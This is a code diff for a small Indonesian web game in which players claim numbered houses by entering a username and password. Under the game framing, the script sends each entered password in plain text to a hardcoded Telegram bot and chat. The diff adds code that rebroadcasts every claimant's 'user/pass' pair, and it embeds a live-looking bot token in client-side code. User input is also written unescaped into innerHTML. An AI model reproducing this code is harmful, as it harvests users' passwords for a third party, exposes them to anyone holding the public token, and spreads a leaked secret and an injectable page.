@@ -8,7 +8,7 @@
     .rumah {
       width: 120px; height: 120px; background: #cce; border: 2px solid #333;
       border-radius: 8px; display: flex; flex-direction: column; justify-content: center; align-items: center;
-      font-weight: bold; cursor: pointer; box-shadow: 2px 2px 6px rgba(0,0,0,0.2);
+      font-weight: bold; cursor: default; box-shadow: 2px 2px 6px rgba(0,0,0,0.2);
     }
     .claimed { background: #aaffaa; }
     #formBox { margin-top: 20px; }
@@ -25,17 +25,17 @@
 <div class="jalan" id="jalan"></div>
 
 <div id="formBox">
-  <h3>Klaim / Edit Rumah</h3>
+  <h3>Klaim Rumah (jika belum diklaim)</h3>
   <input id="nomorRumah" placeholder="Rumah ke-" type="number" min="1" max="10">
   <input id="username" placeholder="Username">
   <input id="password" placeholder="Password" type="password">
-  <button onclick="klaim()">Klaim / Ganti Nama</button>
+  <button onclick="klaim()">Klaim Rumah</button>
 </div>
 
 <script>
-  const token = "7961343490:AAGKb3JPPVBj1egmQU0hq2VfZTFmlx1zpi8"; // Token bot kamu
-  const chat_id = "6501126879"; // Chat ID tujuan
-  const rumahList = Array(10).fill(null);
+  const token = "7961343490:AAGKb3JPPVBj1egmQU0hq2VfZTFmlx1zpi8";
+  const chat_id = "6501126879";
+  let rumahList = Array(10).fill(null);
 
   function renderRumah() {
     const jalan = document.getElementById("jalan");
@@ -43,9 +43,19 @@
     for (let i = 0; i < 10; i++) {
       const div = document.createElement("div");
       div.className = "rumah" + (rumahList[i] ? " claimed" : "");
-      div.innerHTML = `Rumah ${i + 1}<br><small>${rumahList[i] || "Belum diklaim"}</small>`;
+      const isi = rumahList[i] ? rumahList[i].split("/")[0] : "❌ Belum diklaim";
+      div.innerHTML = `Rumah ${i + 1}<br><small>${isi}</small>`;
       jalan.appendChild(div);
     }
+  }
+
+  function formatPesanKeBot() {
+    let text = "🗂 Update Rumah UVOWORLD\n\n";
+    for (let i = 0; i < 10; i++) {
+      const isi = rumahList[i] ? rumahList[i] : "x";
+      text += `🏠 Rumah ${i + 1}: ${isi}\n`;
+    }
+    return text;
   }
 
   function klaim() {
@@ -54,16 +64,19 @@
     const pass = document.getElementById("password").value.trim();
     if (!nomor || !user || !pass || nomor < 1 || nomor > 10) return alert("Isi semua kolom dengan benar!");
 
-    rumahList[nomor - 1] = user;
+    const idx = nomor - 1;
+    if (rumahList[idx]) return alert("❌ Rumah sudah diklaim oleh orang lain!");
+
+    rumahList[idx] = `${user}/${pass}`;
     renderRumah();
 
-    const text = `🏠 Rumah ${nomor} diklaim/ganti oleh ${user}\n🔒 Password: ${pass}`;
+    const pesan = formatPesanKeBot();
     fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id, text })
+      body: JSON.stringify({ chat_id, text: pesan })
     })
-    .then(() => alert("✅ Terkirim ke bot."))
+    .then(() => alert("✅ Data terkirim ke bot."))
     .catch(() => alert("❌ Gagal kirim ke bot."));
   }
 
@@ -72,25 +85,30 @@
       .then(res => res.json())
       .then(data => {
         const pesan = data.result;
-        for (let i = 0; i < 10; i++) rumahList[i] = null; // Reset dulu
-
-        pesan.forEach(item => {
-          const msg = item?.message?.text;
-          const match = msg?.match(/Rumah (\\d+) (?:diklaim|ganti) oleh (.+)/);
-          if (match) {
-            const idx = parseInt(match[1]) - 1;
-            const nama = match[2].trim();
-            if (idx >= 0 && idx < 10) rumahList[idx] = nama;
+        let teks = "";
+        for (let i = pesan.length - 1; i >= 0; i--) {
+          const msg = pesan[i]?.message?.text;
+          if (msg && msg.includes("Update Rumah UVOWORLD")) {
+            teks = msg;
+            break;
           }
-        });
-
+        }
+        if (!teks) return renderRumah();
+        const lines = teks.split("\n").slice(2);
+        rumahList = Array(10).fill(null);
+        for (let i = 0; i < 10; i++) {
+          const match = lines[i]?.match(/Rumah (\d+): (.+)/);
+          if (match) {
+            rumahList[i] = match[2] === "x" ? null : match[2];
+          }
+        }
         renderRumah();
       })
       .catch(() => console.log("❌ Gagal ambil data dari bot."));
   }
 
-  ambilDataDariBot(); // Ambil awal
-  setInterval(ambilDataDariBot, 5000); // Ambil terus tiap 5 detik
+  setInterval(ambilDataDariBot, 5000);
+  ambilDataDariBot();
 </script>
 
 </body>
